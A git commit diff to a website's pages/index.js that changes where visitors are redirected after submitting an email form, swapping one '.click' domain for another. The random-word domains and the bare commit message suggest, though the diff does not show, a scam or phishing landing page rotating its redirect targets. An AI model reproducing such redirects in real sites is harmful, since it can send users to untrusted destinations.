080752418cc846c8d46132633587f77ed372f5f4
husknet <127146284+husknet@users.noreply.github.com>
2024-11-04 15:28:14 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://ct.truisss-window.click';
+        window.location.href = 'https://ct.logbook-annul-srt.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
